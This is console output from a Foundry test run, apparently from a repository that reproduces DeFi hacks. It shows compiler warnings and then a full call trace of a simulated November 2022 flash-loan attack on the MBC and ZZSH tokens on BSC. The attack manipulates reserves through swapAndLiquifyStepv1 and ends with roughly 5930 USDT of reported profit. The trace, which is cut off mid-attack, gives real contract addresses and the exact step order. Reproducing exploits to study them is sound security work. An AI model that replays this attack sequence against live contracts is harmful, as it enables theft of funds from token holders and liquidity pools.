Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.21s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2022-11/MBC_ZZSH_exp.sol:22:5:
   |
22 |     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
    --> src/test/interface.sol:1582:1:
     |
1582 | interface USDT {
     | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 261.82ms (180.62µs CPU time)

Ran 1 test for src/test/2022-11/MBC_ZZSH_exp.sol:ContractTest
[PASS] testExploit() (gas: 801464)
Logs:
  [End] Attacker USDT balance after exploit: 5930.678886576313268612

Traces:
  [833464] ContractTest::testExploit()
    ├─ [24562] 0x55d398326f99059fF775485246999027B3197955::approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [24661] 0x4E87880A72f6896E7e0a635A5838fFc89b13bd17::approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [24661] 0xeE04a3f9795897fd74b7F04Bb299Ba25521606e6::approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [2531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A) [staticcall]
    │   └─ ← [Return] 794994271783747229185351 [7.949e23]
    ├─ [707706] 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A::flashLoan(0, 794994271783747229185351 [7.949e23], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x00)
    │   ├─ [27971] 0x55d398326f99059fF775485246999027B3197955::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 794994271783747229185351 [7.949e23])
    │   │   ├─ emit Transfer(from: 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 794994271783747229185351 [7.949e23])
    │   │   └─ ← [Return] true
    │   ├─ [653398] ContractTest::DPPFlashLoanCall(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 794994271783747229185351 [7.949e23], 0x00)
    │   │   ├─ [9651] 0x10ED43C718714eb63d5aA57B78B54704E256024E::getAmountsOut(150000000000000000000000 [1.5e23], [0x55d398326f99059fF775485246999027B3197955, 0x4E87880A72f6896E7e0a635A5838fFc89b13bd17]) [staticcall]
    │   │   │   ├─ [2893] 0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1::getReserves() [staticcall]
    │   │   │   │   └─ ← [Return] 12475110456913920021663 [1.247e22], 10976748888389080860664 [1.097e22], 1669705943 [1.669e9]
    │   │   │   └─ ← [Return] [150000000000000000000000 [1.5e23], 11622466224903562048186 [1.162e22]]
    │   │   ├─ [8071] 0x55d398326f99059fF775485246999027B3197955::transfer(0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1, 150000000000000000000000 [1.5e23])
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1, value: 150000000000000000000000 [1.5e23])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [124225] 0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1::swap(11622466224903562048186 [1.162e22], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   │   ├─ [89721] 0x4E87880A72f6896E7e0a635A5838fFc89b13bd17::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 11622466224903562048186 [1.162e22])
    │   │   │   │   ├─ emit Transfer(from: 0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1, to: 0x000000000000000000000000000000000000dEaD, value: 348673986747106861443 [3.486e20])
    │   │   │   │   ├─ emit Transfer(from: 0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1, to: 0x4E87880A72f6896E7e0a635A5838fFc89b13bd17, value: 464898648996142481924 [4.648e20])
    │   │   │   │   ├─ emit Transfer(from: 0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1, to: 0xb926F44596D1FE4323C2dC207097FcEf5A94Cac7, value: 116224662249035620481 [1.162e20])
    │   │   │   │   ├─ emit Transfer(from: 0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 10692668926911277084252 [1.069e22])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [664] 0x4E87880A72f6896E7e0a635A5838fFc89b13bd17::balanceOf(0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1) [staticcall]
    │   │   │   │   └─ ← [Return] 852644232010357973563 [8.526e20]
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1) [staticcall]
    │   │   │   │   └─ ← [Return] 160976748888389080860664 [1.609e23]
    │   │   │   ├─ emit Sync(reserve0: 852644232010357973563 [8.526e20], reserve1: 160976748888389080860664 [1.609e23])
    │   │   │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 86, amount1In: 150000000000000000000000 [1.5e23], amount0Out: 11622466224903562048186 [1.162e22], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [115628] 0x4E87880A72f6896E7e0a635A5838fFc89b13bd17::swapAndLiquifyStepv1()
    │   │   │   ├─ [2531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x4E87880A72f6896E7e0a635A5838fFc89b13bd17) [staticcall]
    │   │   │   │   └─ ← [Return] 8910121517374895634224 [8.91e21]
    │   │   │   ├─ [103254] 0x10ED43C718714eb63d5aA57B78B54704E256024E::addLiquidity(0x55d398326f99059fF775485246999027B3197955, 0x4E87880A72f6896E7e0a635A5838fFc89b13bd17, 8910121517374895634224 [8.91e21], 467358936187192577934 [4.673e20], 0, 0, 0x77bAC6826BD30E01c5dF4C0810B1e01F2AdaecB4, 1669726874 [1.669e9])
    │   │   │   │   ├─ [2676] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::getPair(0x55d398326f99059fF775485246999027B3197955, 0x4E87880A72f6896E7e0a635A5838fFc89b13bd17) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1
    │   │   │   │   ├─ [893] 0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1::getReserves() [staticcall]
    │   │   │   │   │   └─ ← [Return] 852644232010357973563 [8.526e20], 160976748888389080860664 [1.609e23], 1669726874 [1.669e9]
    │   │   │   │   ├─ [13634] 0x55d398326f99059fF775485246999027B3197955::transferFrom(0x4E87880A72f6896E7e0a635A5838fFc89b13bd17, 0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1, 8910121517374895634224 [8.91e21])
    │   │   │   │   │   ├─ emit Transfer(from: 0x4E87880A72f6896E7e0a635A5838fFc89b13bd17, to: 0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1, value: 8910121517374895634224 [8.91e21])
    │   │   │   │   │   ├─ emit Approval(owner: 0x4E87880A72f6896E7e0a635A5838fFc89b13bd17, spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 99990016166507403782538005 [9.999e25])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [15786] 0x4E87880A72f6896E7e0a635A5838fFc89b13bd17::transferFrom(0x4E87880A72f6896E7e0a635A5838fFc89b13bd17, 0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1, 47194167920290574428 [4.719e19])
    │   │   │   │   │   ├─ emit Transfer(from: 0x4E87880A72f6896E7e0a635A5838fFc89b13bd17, to: 0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1, value: 47194167920290574428 [4.719e19])
    │   │   │   │   │   ├─ emit Approval(owner: 0x4E87880A72f6896E7e0a635A5838fFc89b13bd17, spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 99998682958039450164972810 [9.999e25])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [61036] 0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1::mint(0x77bAC6826BD30E01c5dF4C0810B1e01F2AdaecB4)
    │   │   │   │   │   ├─ [664] 0x4E87880A72f6896E7e0a635A5838fFc89b13bd17::balanceOf(0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 899838399930648547991 [8.998e20]
    │   │   │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 169886870405763976494888 [1.698e23]
    │   │   │   │   │   ├─ [2354] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::feeTo() [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x0ED943Ce24BaEBf257488771759F9BF482C39706
    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x0ED943Ce24BaEBf257488771759F9BF482C39706, value: 4686200232667967754 [4.686e18])
    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x77bAC6826BD30E01c5dF4C0810B1e01F2AdaecB4, value: 632669642148061983731 [6.326e20])
    │   │   │   │   │   ├─ emit Sync(reserve0: 899838399930648547991 [8.998e20], reserve1: 169886870405763976494888 [1.698e23])
    │   │   │   │   │   ├─ emit Mint(sender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, amount0: 47194167920290574428 [4.719e19], amount1: 8910121517374895634224 [8.91e21])
    │   │   │   │   │   └─ ← [Return] 632669642148061983731 [6.326e20]
    │   │   │   │   └─ ← [Return] 8910121517374895634224 [8.91e21], 47194167920290574428 [4.719e19], 632669642148061983731 [6.326e20]
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1, 1001)
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1, value: 1001)
    │   │   │   └─ ← [Return] true
    │   │   ├─ [664] 0x4E87880A72f6896E7e0a635A5838fFc89b13bd17::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 10692668926911277084252 [1.069e22]
    │   │   ├─ [30371] 0x4E87880A72f6896E7e0a635A5838fFc89b13bd17::transfer(0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1, 10692668926911277084252 [1.069e22])
    │   │   │   ├─ [465] 0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1::token0() [staticcall]
    │   │   │   │   └─ ← [Return] 0x4E87880A72f6896E7e0a635A5838fFc89b13bd17
    │   │   │   ├─ [397] 0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1::token1() [staticcall]
    │   │   │   │   └─ ← [Return] 0x55d398326f99059fF775485246999027B3197955
    │   │   │   ├─ [893] 0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1::getReserves() [staticcall]
    │   │   │   │   └─ ← [Return] 899838399930648547991 [8.998e20], 169886870405763976494888 [1.698e23], 1669726874 [1.669e9]
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1) [staticcall]
    │   │   │   │   └─ ← [Return] 169886870405763976495889 [1.698e23]
    │   │   │   ├─ [664] 0x4E87880A72f6896E7e0a635A5838fFc89b13bd17::balanceOf(0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1) [staticcall]
    │   │   │   │   └─ ← [Return] 899838399930648547991 [8.998e20]
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x000000000000000000000000000000000000dEaD, value: 320747989800557578566 [3.207e20])
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x4E87880A72f6896E7e0a635A5838fFc89b13bd17, value: 427663986400743438088 [4.276e20])
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xb926F44596D1FE4323C2dC207097FcEf5A94Cac7, value: 106915996600185859522 [1.069e20])
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1, value: 9836271687217099076024 [9.836e21])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [893] 0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1::getReserves() [staticcall]
    │   │   │   └─ ← [Return] 899838399930648547991 [8.998e20], 169886870405763976494888 [1.698e23], 1669726874 [1.669e9]
    │   │   ├─ [664] 0x4E87880A72f6896E7e0a635A5838fFc89b13bd17::balanceOf(0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1) [staticcall]
    │   │   │   └─ ← [Return] 10736110087147747624015 [1.073e22]
    │   │   ├─ [5111] 0x10ED43C718714eb63d5aA57B78B54704E256024E::getAmountsOut(9836271687217099076024 [9.836e21], [0x4E87880A72f6896E7e0a635A5838fFc89b13bd17, 0x55d398326f99059fF775485246999027B3197955]) [staticcall]
    │   │   │   ├─ [893] 0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1::getReserves() [staticcall]
    │   │   │   │   └─ ← [Return] 899838399930648547991 [8.998e20], 169886870405763976494888 [1.698e23], 1669726874 [1.669e9]
    │   │   │   └─ ← [Return] [9836271687217099076024 [9.836e21], 155615250870445917394455 [1.556e23]]
    │   │   ├─ [18502] 0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1::swap(0, 155615250870445917394455 [1.556e23], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 155615250870445917394455 [1.556e23])
    │   │   │   │   ├─ emit Transfer(from: 0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 155615250870445917394455 [1.556e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [664] 0x4E87880A72f6896E7e0a635A5838fFc89b13bd17::balanceOf(0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1) [staticcall]
    │   │   │   │   └─ ← [Return] 10736110087147747624015 [1.073e22]
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1) [staticcall]
    │   │   │   │   └─ ← [Return] 14271619535318059101434 [1.427e22]
    │   │   │   ├─ emit Sync(reserve0: 10736110087147747624015 [1.073e22], reserve1: 14271619535318059101434 [1.427e22])
    │   │   │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 9836271687217099076024 [9.836e21], amount1In: 1001, amount0Out: 0, amount1Out: 155615250870445917394455 [1.556e23], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [9611] 0x10ED43C718714eb63d5aA57B78B54704E256024E::getAmountsOut(150000000000000000000000 [1.5e23], [0x55d398326f99059fF775485246999027B3197955, 0xeE04a3f9795897fd74b7F04Bb299Ba25521606e6]) [staticcall]
    │   │   │   ├─ [2893] 0x33CCA0E0CFf617a2aef1397113E779E42a06a74A::getReserves() [staticcall]
    │   │   │   │   └─ ← [Return] 13207730083446253382868 [1.32e22], 332419158933835275685 [3.324e20], 1669723294 [1.669e9]
    │   │   │   └─ ← [Return] [150000000000000000000000 [1.5e23], 305455891023788359040 [3.054e20]]
    │   │   ├─ [8071] 0x55d398326f99059fF775485246999027B3197955::transfer(0x33CCA0E0CFf617a2aef1397113E779E42a06a74A, 150000000000000000000000 [1.5e23])
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x33CCA0E0CFf617a2aef1397113E779E42a06a74A, value: 150000000000000000000000 [1.5e23])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [115571] 0x33CCA0E0CFf617a2aef1397113E779E42a06a74A::swap(0, 305455891023788359040 [3.054e20], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   │   ├─ [81122] 0xeE04a3f9795897fd74b7F04Bb299Ba25521606e6::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 305455891023788359040 [3.054e20])
    │   │   │   │   ├─ emit Transfer(from: 0x33CCA0E0CFf617a2aef1397113E779E42a06a74A, to: 0x000000000000000000000000000000000000dEaD, value: 3054558910237883590 [3.054e18])
    │   │   │   │   ├─ emit Transfer(from: 0x33CCA0E0CFf617a2aef1397113E779E42a06a74A, to: 0xeE04a3f9795897fd74b7F04Bb299Ba25521606e6, value: 6109117820475767180 [6.109e18])
    │   │   │   │   ├─ emit Transfer(from: 0x33CCA0E0CFf617a2aef1397113E779E42a06a74A, to: 0xAA37693d4f6A29272B94fe7476863bDE5c6e9769, value: 1527279455118941795 [1.527e18])
    │   │   │   │   ├─ emit Transfer(from: 0x33CCA0E0CFf617a2aef1397113E779E42a06a74A, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 294764934837955766435 [2.947e20])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x33CCA0E0CFf617a2aef1397113E779E42a06a74A) [staticcall]
    │   │   │   │   └─ ← [Return] 163207730083446253382868 [1.632e23]
    │   │   │   ├─ [598] 0xeE04a3f9795897fd74b7F04Bb299Ba25521606e6::balanceOf(0x33CCA0E0CFf617a2aef1397113E779E42a06a74A) [staticcall]
    │   │   │   │   └─ ← [Return] 26963267910046916685 [2.696e19]
    │   │   │   ├─ emit Sync(reserve0: 163207730083446253382868 [1.632e23], reserve1: 26963267910046916685 [2.696e19])
    │   │   │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 150000000000000000000000 [1.5e23], amount1In: 40, amount0Out: 0, amount1Out: 305455891023788359040 [3.054e20], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [118822] 0xeE04a3f9795897fd74b7F04Bb299Ba25521606e6::swapAndLiquifyStepv1()
    │   │   │   ├─ [2531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0xeE04a3f9795897fd74b7F04Bb299Ba25521606e6) [staticcall]
    │   │   │   │   └─ ← [Return] 1525554339326077833068 [1.525e21]
    │   │   │   ├─ [108236] 0x10ED43C718714eb63d5aA57B78B54704E256024E::addLiquidity(0x55d398326f99059fF775485246999027B3197955, 0xeE04a3f9795897fd74b7F04Bb299Ba25521606e6, 1525554339326077833068 [1.525e21], 6441594929497596671 [6.441e18], 0, 0, 0xCdC0B32AB15D1F5ECdC5Aa51d0F9ed98B18a1562, 1669726874 [1.669e9])
    │   │   │   │   ├─ [2676] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::getPair(0x55d398326f99059fF775485246999027B3197955, 0xeE04a3f9795897fd74b7F04Bb299Ba25521606e6) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x33CCA0E0CFf617a2aef1397113E779E42a06a74A
    │   │   │   │   ├─ [893] 0x33CCA0E0CFf617a2aef1397113E779E42a06a74A::getReserves() [staticcall]
    │   │   │   │   │   └─ ← [Return] 163207730083446253382868 [1.632e23], 26963267910046916685 [2.696e19], 1669726874 [1.669e9]
    │   │   │   │   ├─ [13634] 0x55d398326f99059fF775485246999027B3197955::transferFrom(0xeE04a3f9795897fd74b7F04Bb299Ba25521606e6, 0x33CCA0E0CFf617a2aef1397113E779E42a06a74A, 1525554339326077833068 [1.525e21])
    │   │   │   │   │   ├─ emit Transfer(from: 0xeE04a3f9795897fd74b7F04Bb299Ba25521606e6, to: 0x33CCA0E0CFf617a2aef1397113E779E42a06a74A, value: 1525554339326077833068 [1.525e21])
    │   │   │   │   │   ├─ emit Approval(owner: 0xeE04a3f9795897fd74b7F04Bb299Ba25521606e6, spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 997422830355986137095177 [9.974e23])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [26028] 0xeE04a3f9795897fd74b7F04Bb299Ba25521606e6::transferFrom(0xeE04a3f9795897fd74b7F04Bb299Ba25521606e6, 0x33CCA0E0CFf617a2aef1397113E779E42a06a74A, 252034204149229631 [2.52e17])
    │   │   │   │   │   ├─ [465] 0x33CCA0E0CFf617a2aef1397113E779E42a06a74A::token0() [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x55d398326f99059fF775485246999027B3197955
    │   │   │   │   │   ├─ [397] 0x33CCA0E0CFf617a2aef1397113E779E42a06a74A::token1() [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0xeE04a3f9795897fd74b7F04Bb299Ba25521606e6
    │   │   │   │   │   ├─ [893] 0x33CCA0E0CFf617a2aef1397113E779E42a06a74A::getReserves() [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 163207730083446253382868 [1.632e23], 26963267910046916685 [2.696e19], 1669726874 [1.669e9]
    │   │   │   │   │   ├─ [598] 0xeE04a3f9795897fd74b7F04Bb299Ba25521606e6::balanceOf(0x33CCA0E0CFf617a2aef1397113E779E42a06a74A) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 26963267910046916685 [2.696e19]
    │   │   │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x33CCA0E0CFf617a2aef1397113E779E42a06a74A) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 164733284422772331215936 [1.647e23]
    │   │   │   │   │   ├─ emit Transfer(from: 0xeE04a3f9795897fd74b7F04Bb299Ba25521606e6, to: 0x33CCA0E0CFf617a2aef1397113E779E42a06a74A, value: 252034204149229631 [2.52e17])
    │   │   │   │   │   ├─ emit Approval(owner: 0xeE04a3f9795897fd74b7F04Bb299Ba25521606e6, spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 998945835410818535097586 [9.989e23])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [58326] 0x33CCA0E0CFf617a2aef1397113E779E42a06a74A::mint(0xCdC0B32AB15D1F5ECdC5Aa51d0F9ed98B18a1562)
    │   │   │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x33CCA0E0CFf617a2aef1397113E779E42a06a74A) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 164733284422772331215936 [1.647e23]
    │   │   │   │   │   ├─ [598] 0xeE04a3f9795897fd74b7F04Bb299Ba25521606e6::balanceOf(0x33CCA0E0CFf617a2aef1397113E779E42a06a74A) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 27215302114196146316 [2.721e19]
    │   │   │   │   │   ├─ [354] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::feeTo() [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x0ED943Ce24BaEBf257488771759F9BF482C39706
    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x0ED943Ce24BaEBf257488771759F9BF482C39706, value: 738018100495948760 [7.38e17])
    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0xCdC0B32AB15D1F5ECdC5Aa51d0F9ed98B18a1562, value: 18615973487734598921 [1.861e19])
    │   │   │   │   │   ├─ emit Sync(reserve0: 164733284422772331215936 [1.647e23], reserve1: 27215302114196146316 [2.721e19])
    │   │   │   │   │   ├─ emit Mint(sender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, amount0: 1525554339326077833068 [1.525e21], amount1: 252034204149229631 [2.52e17])
    │   │   │   │   │   └─ ← [Return] 18615973487734598921 [1.861e19]
    │   │   │   │   └─ ← [Return] 1525554339326077833068 [1.525e21], 252034204149229631 [2.52e17], 18615973487734598921 [1.861e19]
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0x33CCA0E0CFf617a2aef1397113E779E42a06a74A, 1001)
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x33CCA0E0CFf617a2aef1397113E779E42a06a74A, value: 1001)
    │   │   │   └─ ← [Return] true
    │   │   ├─ [598] 0xeE04a3f9795897fd74b7F04Bb299Ba25521606e6::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 294764934837955766435 [2.947e20]
    │   │   ├─ [25431] 0xeE04a3f9795897fd74b7F04Bb299Ba25521606e6::transfer(0x33CCA0E0CFf617a2aef1397113E779E42a06a74A, 294764934837955766435 [2.947e20])
    │   │   │   ├─ [465] 0x33CCA0E0CFf617a2aef1397113E779E42a06a74A::token0() [staticcall]
    │   │   │   │   └─ ← [Return] 0x55d398326f99059fF775485246999027B3197955
